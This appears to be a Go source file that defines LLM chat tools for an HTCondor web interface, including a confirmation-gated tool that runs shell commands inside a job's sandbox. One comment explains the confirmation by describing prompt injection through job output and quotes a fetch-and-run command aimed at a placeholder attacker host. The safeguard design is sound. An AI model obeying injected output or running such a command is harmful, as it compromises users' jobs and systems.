package httpserver

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"strings"
	"time"

	htcondor "github.com/bbockelm/golang-htcondor"
	"github.com/bbockelm/golang-htcondor/httpserver/chat"
	"golang.org/x/crypto/ssh"
)

// Per-job-page chat tools.
//
// Most of these are client-side stubs whose schemas live here so the
// LLM sees what's available; execution is in the SPA — the engine
// forwards the tool_use to the browser and the next POST carries the
// result back. The matching dispatch is in
// frontend/src/app/jobs/[id]/JobDetailClient.tsx.
//
// One server-side tool (toolRunInJob) lives here too: it reaches into
// the running job's sandbox via condor_ssh_to_job and runs a single
// non-interactive command. Owner-scoping is enforced explicitly before
// the SSH dial so a misbehaving schedd-side ACL can't be exploited
// through this path.

// runInJobOutputCapDefault / runInJobOutputCapMax bound the combined
// stdout+stderr returned to the LLM. The defaults were 64 KiB but
// that was way too generous for chat: a single `ps -ef` could fill
// an Anthropic turn with ~16k tokens of process listing, then keep
// re-paying that cost in every subsequent turn because the result
// stays in conversation history.
//
// 8 KiB (~2k tokens) is enough for "did the file appear?", "what's
// in this config?", `tail -n 50 logfile`, etc. — the chat use
// cases the tool is meant for. The LLM can request more via
// `max_output_bytes` up to runInJobOutputCapMax (24 KiB ≈ ~6k
// tokens), but the documented pattern is to pipe through
// `head -c`/`tail -c`/`head -n`/`grep` instead — iterating with a
// tighter pipe is dramatically cheaper than one big return.
const (
	runInJobOutputCapDefault = 8 * 1024
	runInJobOutputCapMax     = 24 * 1024
)

// runInJobDefaultTimeout is the default wall-clock cap for a single
// command. The LLM can request shorter via the input arg; longer is
// clamped at runInJobMaxTimeout.
const (
	runInJobDefaultTimeout = 30 * time.Second
	runInJobMaxTimeout     = 60 * time.Second
)

// runInJobArgs is the on-wire shape the LLM passes to run_in_job.
type runInJobArgs struct {
	JobID          string `json:"job_id"`
	Command        string `json:"command"`
	TimeoutSeconds int    `json:"timeout_seconds,omitempty"`
	// MaxOutputBytes caps the returned combined stdout+stderr.
	// Defaults to runInJobOutputCapDefault, clamped to
	// runInJobOutputCapMax. Zero / negative means "use the default".
	MaxOutputBytes int `json:"max_output_bytes,omitempty"`
}

// toolRunInJob runs a single non-interactive shell command inside the
// job's sandbox over condor_ssh_to_job. Owner-scoped: we look up the
// job's ClassAd first and refuse if Owner != actor.
func (s *Handler) toolRunInJob() chat.Tool {
	return &chatTool{
		name:  "run_in_job",
		pages: jobDetailPageTools,
		// confirm: true — although the description encourages
		// read-only inspection, the tool actually exposes arbitrary
		// shell-command execution inside the job sandbox. A
		// prompt-injection in stdout/stderr (which the LLM ingests via
		// read_job_output) could trick it into invoking
		// `command: "curl http://attacker/payload | bash"`. Routing
		// every invocation through the SPA's confirmation dialog
		// matches the policy on edit_job_attribute / hold_job /
		// release_job / remove_jobs.
		confirm: true,
		description: `Run a single non-interactive shell command inside the job's sandbox ` +
			`(equivalent to: condor_ssh_to_job <id> <cmd>). Only works while the job is ` +
			`Running (status=2) or Transferring Output (status=6). Returns combined ` +
			`stdout+stderr capped at 8 KiB by default (max 24 KiB via max_output_bytes) ` +
			`plus the exit code. ` +
			`USE FOR: quick read-only inspection — "ls -la", "ps -ef", "tail -n 30 logfile", ` +
			`"top -b -n 1 | head -20", "cat config.json". ` +
			`** TOKEN BUDGET: ** the returned output stays in chat history and is re-billed ` +
			`every turn — prefer a tight pipe (head -c, tail -c, head -n, grep) over a big ` +
			`raw return. Re-running with a narrower pipe is dramatically cheaper than ` +
			`raising max_output_bytes. ` +
			`DO NOT spawn long-running processes; the per-call timeout (default 30s, max 60s) ` +
			`will kill them. The shell session has the job's environment and current ` +
			`working directory. Requires user confirmation.`,
		schema: json.RawMessage(`{
			"type": "object",
			"properties": {
				"job_id": {
					"type": "string",
					"description": "Target job in cluster.proc form (e.g. \"42.0\"). Pulled from page context if you don't have it elsewhere."
				},
				"command": {
					"type": "string",
					"description": "Shell command to execute. Non-interactive; use shell quoting as you would on a normal terminal."
				},
				"timeout_seconds": {
					"type": "integer",
					"description": "Wall-clock cap. Default 30, max 60.",
					"minimum": 1,
					"maximum": 60
				},
				"max_output_bytes": {
					"type": "integer",
					"description": "Cap on combined stdout+stderr bytes returned. Default 8192 (~2k tokens). Max 24576. Prefer a tighter pipe over raising this.",
					"minimum": 1024,
					"maximum": 24576
				}
			},
			"required": ["job_id", "command"]
		}`),
		exec: s.execRunInJob,
	}
}

// execRunInJob is split out for testability. The exec closure on
// chatTool can't be a method on *Handler in Go, but pulling the body
// to a method keeps coverage honest.
func (s *Handler) execRunInJob(ctx context.Context, actor string, in json.RawMessage) (string, error) {
	var args runInJobArgs
	if err := json.Unmarshal(in, &args); err != nil {
		return "", fmt.Errorf("invalid args: %w", err)
	}
	cmd := strings.TrimSpace(args.Command)
	if cmd == "" {
		return "", errors.New("command must not be empty")
	}
	cluster, proc, err := parseJobID(strings.TrimSpace(args.JobID))
	if err != nil {
		return "", fmt.Errorf("invalid job_id: %w", err)
	}

	timeout := runInJobDefaultTimeout
	if args.TimeoutSeconds > 0 {
		timeout = time.Duration(args.TimeoutSeconds) * time.Second
		if timeout > runInJobMaxTimeout {
			timeout = runInJobMaxTimeout
		}
	}

	schedd := s.getSchedd()
	if schedd == nil {
		return "", errors.New("schedd not configured")
	}

	// Step 1: confirm the job exists, is owned by actor, and is in a
	// state where condor_ssh_to_job can connect (Running or
	// Transferring Output). We do this BEFORE the SSH dial so a
	// well-formed "no, you can't ssh into a held job" error gets back
	// to the LLM instead of a generic "starter not running" wrapped
	// in retry backoff.
	ownerConstraint := fmt.Sprintf("ClusterId == %d && ProcId == %d && Owner == %s",
		cluster, proc, classadStringLit(actor))
	ads, _, err := schedd.QueryWithOptions(ctx, ownerConstraint, &htcondor.QueryOptions{
		Limit:      1,
		Projection: []string{"ClusterId", "ProcId", "Owner", "JobStatus"},
	})
	if err != nil {
		return "", fmt.Errorf("ownership check: %w", err)
	}
	if len(ads) == 0 {
		return "", fmt.Errorf("job %d.%d either does not exist or is not owned by %s",
			cluster, proc, actor)
	}
	status, _ := readInt(ads[0], "JobStatus")
	if status != 2 && status != 6 {
		return "", fmt.Errorf("job %d.%d is not running (JobStatus=%d); ssh-to-job only works while the job is on a worker",
			cluster, proc, status)
	}

	// Step 2: open the SSH client. OpenJobShell internally retries
	// transient "starter not running" races for up to 30s. We bound
	// the whole operation to ctx + the per-call timeout so the LLM
	// sees a clean error instead of hanging the chat turn.
	dialCtx, cancelDial := context.WithTimeout(ctx, timeout)
	defer cancelDial()
	sshClient, err := schedd.OpenJobShell(dialCtx, cluster, proc, nil)
	if err != nil {
		return "", fmt.Errorf("open ssh-to-job: %w", err)
	}
	defer func() { _ = sshClient.Close() }()

	session, err := sshClient.NewSession()
	if err != nil {
		return "", fmt.Errorf("open ssh session: %w", err)
	}
	defer func() { _ = session.Close() }()

	// Capture combined output with a hard cap so a chatty command
	// can't blow up the LLM's context window. The LLM can dial
	// max_output_bytes up to runInJobOutputCapMax; we clamp
	// silently — passing a too-big value isn't worth an error round
	// trip, the LLM gets the cap-truncation signal in the response.
	outCap := args.MaxOutputBytes
	if outCap <= 0 {
		outCap = runInJobOutputCapDefault
	}
	if outCap > runInJobOutputCapMax {
		outCap = runInJobOutputCapMax
	}
	var buf cappedBuffer
	buf.cap = outCap
	session.Stdout = &buf
	session.Stderr = &buf

	// Run with a per-command deadline. session.Run blocks; we race it
	// against the context deadline so the LLM doesn't get stuck on a
	// typo'd command that hangs the shell.
	type runResult struct {
		err  error
		code int
	}
	done := make(chan runResult, 1)
	go func() {
		runErr := session.Run(cmd)
		code := 0
		if runErr != nil {
			// *ssh.ExitError carries the real exit code; other
			// errors (network, signal) leave us with -1 and the
			// error message in the result payload.
			var exitErr *ssh.ExitError
			if errors.As(runErr, &exitErr) {
				code = exitErr.ExitStatus()
			} else {
				code = -1
			}
		}
		done <- runResult{err: runErr, code: code}
	}()

	start := time.Now()
	var res runResult
	select {
	case res = <-done:
	case <-dialCtx.Done():
		// Forcibly kill the remote process and tear down the session
		// so the goroutine unwinds. SIGKILL guarantees the starter
		// won't keep a zombied user process around if SIGTERM was
		// blocked.
		_ = session.Signal(ssh.SIGKILL)
		_ = session.Close()
		<-done
		return "", fmt.Errorf("command timed out after %s", time.Since(start).Round(time.Millisecond))
	}

	stdoutText := buf.String()
	out, _ := json.Marshal(map[string]any{
		"job_id":      args.JobID,
		"command":     cmd,
		"exit_code":   res.code,
		"output":      stdoutText,
		"truncated":   buf.Truncated(),
		"duration_ms": time.Since(start).Milliseconds(),
		"error":       errString(res.err),
	})
	return string(out), nil
}

// cappedBuffer is io.Writer that drops further writes after `cap`
// bytes and remembers whether truncation happened. We don't need the
// extra plumbing of a teeing reader; the LLM payload is fixed size.
type cappedBuffer struct {
	bytes.Buffer
	cap     int
	dropped bool
}

func (c *cappedBuffer) Write(p []byte) (int, error) {
	remaining := c.cap - c.Len()
	if remaining <= 0 {
		c.dropped = true
		return len(p), nil
	}
	if len(p) > remaining {
		_, _ = c.Buffer.Write(p[:remaining])
		c.dropped = true
		return len(p), nil
	}
	return c.Buffer.Write(p)
}

func (c *cappedBuffer) Truncated() bool { return c.dropped }

// Compile-time check that cappedBuffer satisfies io.Writer.
var _ io.Writer = (*cappedBuffer)(nil)

func errString(err error) string {
	if err == nil {
		return ""
	}
	return err.Error()
}

// ---------------------------------------------------------------------
// Server-side: edit ClassAd attributes on the current job.
//
// The wire format mirrors HTCondor's: the value passed to the schedd
// SetAttribute RPC must already be a valid ClassAd expression. We
// don't try to be clever about that — the LLM is expected to encode
// strings as `"text"` (with the quotes), integers / reals as bare
// digits, booleans as `true` / `false`, and arbitrary expressions
// as raw text. The schedd refuses immutable / protected attributes
// in our htcondor.EditJob layer; we surface the error verbatim.
//
// Owner-scoping mirrors the hold/release/remove pattern: a query
// confirms the target ClusterId.ProcId is owned by the actor before
// any mutation. Without that a hypothetical schedd ACL gap would
// let an LLM-generated tool call mutate someone else's job.
// ---------------------------------------------------------------------

// editJobAttributeArgs is what the LLM passes to edit_job_attribute.
type editJobAttributeArgs struct {
	ClusterID  int    `json:"cluster_id"`
	ProcID     int    `json:"proc_id"`
	Name       string `json:"name"`
	Expression string `json:"expression"`
}

func (s *Handler) toolEditJobAttribute() chat.Tool {
	return &chatTool{
		name:  "edit_job_attribute",
		pages: jobDetailPageTools,
		description: `Edit a single ClassAd attribute on this job. ` +
			`'expression' must be a valid ClassAd literal — strings as "quoted text", ` +
			`integers / floats as bare digits, booleans as true/false, or any ClassAd ` +
			`expression (e.g. "RequestMemory * 2"). The schedd refuses immutable ` +
			`attributes (ClusterId, ProcId, Owner, QDate, …) and protected attributes ` +
			`(JobStatus, HoldReason, …); the tool surfaces those refusals as errors. ` +
			`Use for targeted user-driven tweaks: bumping JobPrio, fixing a typo in ` +
			`Cmd before release, adding a custom +tag, etc. Requires user confirmation.`,
		schema: json.RawMessage(`{
			"type": "object",
			"properties": {
				"cluster_id": {"type": "integer", "description": "ClusterId of the job to edit"},
				"proc_id":    {"type": "integer", "description": "ProcId of the job to edit"},
				"name":       {"type": "string",  "description": "Attribute name (case-insensitive against ad)"},
				"expression": {
					"type": "string",
					"description": "ClassAd expression, NOT a raw value. Strings need surrounding quotes (\"hello\"); ints/bools/expressions are bare."
				}
			},
			"required": ["cluster_id", "proc_id", "name", "expression"]
		}`),
		confirm: true,
		exec: func(ctx context.Context, actor string, in json.RawMessage) (string, error) {
			var args editJobAttributeArgs
			if err := json.Unmarshal(in, &args); err != nil {
				return "", fmt.Errorf("invalid args: %w", err)
			}
			if args.ClusterID <= 0 || args.ProcID < 0 {
				return "", fmt.Errorf("cluster_id must be > 0 and proc_id must be >= 0")
			}
			if strings.TrimSpace(args.Name) == "" {
				return "", fmt.Errorf("name is required")
			}
			if strings.TrimSpace(args.Expression) == "" {
				return "", fmt.Errorf("expression must not be empty")
			}

			schedd := s.getSchedd()

			// Confirm owner before mutating. Same belt-and-braces
			// approach as hold/release/remove.
			ownerConstraint := fmt.Sprintf("ClusterId == %d && ProcId == %d && Owner == %s",
				args.ClusterID, args.ProcID, classadStringLit(actor))
			ads, _, err := schedd.QueryWithOptions(ctx, ownerConstraint, &htcondor.QueryOptions{
				Limit:      1,
				Projection: []string{"ClusterId", "ProcId", "Owner"},
			})
			if err != nil {
				return "", fmt.Errorf("ownership check: %w", err)
			}
			if len(ads) == 0 {
				return "", fmt.Errorf("job %d.%d either does not exist or is not owned by %s",
					args.ClusterID, args.ProcID, actor)
			}

			err = schedd.EditJob(ctx, args.ClusterID, args.ProcID,
				map[string]string{args.Name: args.Expression},
				&htcondor.EditJobOptions{},
			)
			if err != nil {
				return "", fmt.Errorf("edit_job %d.%d %s: %w",
					args.ClusterID, args.ProcID, args.Name, err)
			}
			out, _ := json.Marshal(map[string]any{
				"action":     "edit_job_attribute",
				"job_id":     fmt.Sprintf("%d.%d", args.ClusterID, args.ProcID),
				"attribute":  args.Name,
				"expression": args.Expression,
			})
			return string(out), nil
		},
	}
}

// editJobsByConstraintArgs is what the LLM passes to
// edit_jobs_by_constraint. Multi-attribute is supported in one call
// so a "raise priority and clear the requirements" sweep is a single
// transaction; the schedd commits or aborts atomically.
type editJobsByConstraintArgs struct {
	Constraint string            `json:"constraint"`
	Attributes map[string]string `json:"attributes"`
}

func (s *Handler) toolEditJobsByConstraint() chat.Tool {
	return &chatTool{
		name:  "edit_jobs_by_constraint",
		pages: jobsPageTools,
		description: `Edit one or more ClassAd attributes on every job matching a ` +
			`constraint. The user does not have a UI for this; the assistant uses it for ` +
			`bulk sweeps like "set JobPrio=10 on every held job in cluster 42" or "clear ` +
			`PeriodicHold on all my idle jobs". 'constraint' is a ClassAd expression ` +
			`auto-scoped to the user's owner; you can't accidentally touch someone else's ` +
			`jobs. 'attributes' values must be valid ClassAd expressions (see ` +
			`edit_job_attribute for the encoding rules). Returns the count of jobs ` +
			`affected. Requires user confirmation.`,
		schema: json.RawMessage(`{
			"type": "object",
			"properties": {
				"constraint": {
					"type": "string",
					"description": "ClassAd filter expression. Auto-scoped to the authenticated user."
				},
				"attributes": {
					"type": "object",
					"description": "Map of attribute name → ClassAd-encoded value (strings quoted, ints bare, etc.).",
					"additionalProperties": {"type": "string"}
				}
			},
			"required": ["constraint", "attributes"]
		}`),
		confirm: true,
		exec: func(ctx context.Context, actor string, in json.RawMessage) (string, error) {
			var args editJobsByConstraintArgs
			if err := json.Unmarshal(in, &args); err != nil {
				return "", fmt.Errorf("invalid args: %w", err)
			}
			if strings.TrimSpace(args.Constraint) == "" {
				return "", fmt.Errorf("constraint is required")
			}
			if len(args.Attributes) == 0 {
				return "", fmt.Errorf("attributes must contain at least one entry")
			}
			for name, expr := range args.Attributes {
				if strings.TrimSpace(name) == "" {
					return "", fmt.Errorf("attribute names must be non-empty")
				}
				if strings.TrimSpace(expr) == "" {
					return "", fmt.Errorf("expression for %q must not be empty", name)
				}
			}

			scoped := scopeToOwner(actor, args.Constraint)
			schedd := s.getSchedd()
			count, err := schedd.EditJobs(ctx, scoped, args.Attributes,
				&htcondor.EditJobOptions{})
			if err != nil {
				return "", fmt.Errorf("edit_jobs: %w", err)
			}
			out, _ := json.Marshal(map[string]any{
				"action":     "edit_jobs_by_constraint",
				"constraint": scoped,
				"attributes": args.Attributes,
				"affected":   count,
			})
			return string(out), nil
		},
	}
}

// ---------------------------------------------------------------------
// Client-side stubs. The SPA in JobDetailClient.tsx implements these.
// ---------------------------------------------------------------------

// toolGetJobAttributes reads ClassAd attributes of the job. The LLM
// can request specific attributes (cheap, focused) or the whole ad
// (token-expensive but sometimes necessary).
func toolGetJobAttributes() chat.Tool {
	return &chatTool{
		name:       "get_job_attributes",
		pages:      jobDetailPageTools,
		clientSide: true,
		description: `Read ClassAd attributes for the current job. Pass ` + "`names`" + ` to get a ` +
			`narrow projection (returns just those attributes). Omit ` + "`names`" + ` to get the ` +
			`full ClassAd (only do this when the user genuinely needs everything; full ads ` +
			`can run hundreds of attributes). The page polls every 10s, so the data is at ` +
			`most a few seconds stale.`,
		schema: json.RawMessage(`{
			"type": "object",
			"properties": {
				"names": {
					"type": "array",
					"items": {"type": "string"},
					"description": "Optional list of attribute names (e.g. [\"HoldReason\",\"HoldReasonCode\",\"RemoteHost\"]). Case-insensitive match against the ad."
				}
			}
		}`),
	}
}

// toolGetJobLog returns the parsed userlog event stream for the job.
// Each event has { event_type, event_typeno, time, ... event-specific
// fields }. The SPA fetches via api.jobs.log() and forwards, then
// trims to max_events newest-first to keep the LLM cost bounded.
func toolGetJobLog() chat.Tool {
	return &chatTool{
		name:       "get_job_log",
		pages:      jobDetailPageTools,
		clientSide: true,
		description: `Fetch the parsed HTCondor userlog event timeline for this job. Returns ` +
			`an ordered list of events: submit, execute, image-size, hold, evict, ` +
			`terminate, etc. Each event carries the timestamp and event-type-specific ` +
			`fields (HoldReason on hold events, ReturnValue on terminate, etc.). Useful ` +
			`for "what happened?" / "when did it last run?" / "how many holds?" questions. ` +
			`** TOKEN BUDGET: ** capped to max_events newest-first events (default 40, ` +
			`max 100). For jobs that have been around forever, ask for a larger window ` +
			`only when the early events actually matter.`,
		schema: json.RawMessage(`{
			"type": "object",
			"properties": {
				"max_events": {
					"type": "integer",
					"description": "Cap on events returned, newest-first. Default 40, max 100.",
					"minimum": 1,
					"maximum": 100
				}
			}
		}`),
	}
}

// toolGetMatchAnalysis triggers (or reads from cache) the
// condor_q -better-analyze-style breakdown for the job. The SPA's
// MatchAnalysisPanel already has the same query; this tool just lets
// the LLM trigger it without the user clicking Run.
func toolGetMatchAnalysis() chat.Tool {
	return &chatTool{
		name:       "get_match_analysis",
		pages:      jobDetailPageTools,
		clientSide: true,
		description: `Run (or read cached) match analysis explaining why an idle/held job ` +
			`isn't being scheduled to a slot. Returns a sorted breakdown of which ` +
			`requirement is excluding the most slots in the pool, plus a summary count ` +
			`of matched / unmatched / not-considered slots. ` +
			`USE FOR: idle (status=1) or held (status=5) jobs only. For other states ` +
			`the result is meaningless. Heavy on first call (collector slot dump); ` +
			`server caches for ~30s.`,
		schema: json.RawMessage(`{"type": "object", "properties": {}}`),
	}
}

// toolReadJobOutput grep/head/tail on stdout or stderr of a finished
// job. Server-side endpoint streams the file with a 1 MiB cap; the
// SPA caches the fetched text and then performs the requested
// projection (head/tail/grep) entirely client-side so multiple
// follow-up reads don't keep re-fetching from the schedd.
func toolReadJobOutput() chat.Tool {
	return &chatTool{
		name:       "read_job_output",
		pages:      jobDetailPageTools,
		clientSide: true,
		description: `Read part of the job's stdout or stderr (only valid for completed/removed ` +
			`jobs whose output has been transferred back). Choose a ` + "`mode`" + `:` +
			`"head" returns the first N lines, "tail" returns the last N lines, "grep" ` +
			`returns lines matching a regex pattern (with surrounding context if you ` +
			`set "context_lines"). ` +
			`** TOKEN BUDGET: ** the response is byte-capped (~8 KiB / ~2k tokens) on top ` +
			`of the line / match caps — wide lines get fewer of them. If the file is larger ` +
			`than 1 MiB the underlying fetch returns the first MiB only and the response ` +
			`notes it via "truncated":true. For verbose output, prefer grep with a tight ` +
			`pattern over head/tail.`,
		schema: json.RawMessage(`{
			"type": "object",
			"properties": {
				"stream":  {"type": "string", "enum": ["stdout", "stderr"], "description": "Which file to read."},
				"mode":    {"type": "string", "enum": ["head", "tail", "grep"], "description": "What slice of the file to return."},
				"lines":   {"type": "integer", "minimum": 1, "maximum": 150, "description": "Number of lines for head/tail (default 30, max 150)."},
				"pattern": {"type": "string", "description": "Regex pattern for grep mode."},
				"context_lines": {"type": "integer", "minimum": 0, "maximum": 5, "description": "Lines of context around each grep match (default 0)."},
				"case_insensitive": {"type": "boolean", "description": "If true, grep ignores case (default false)."}
			},
			"required": ["stream", "mode"]
		}`),
	}
}
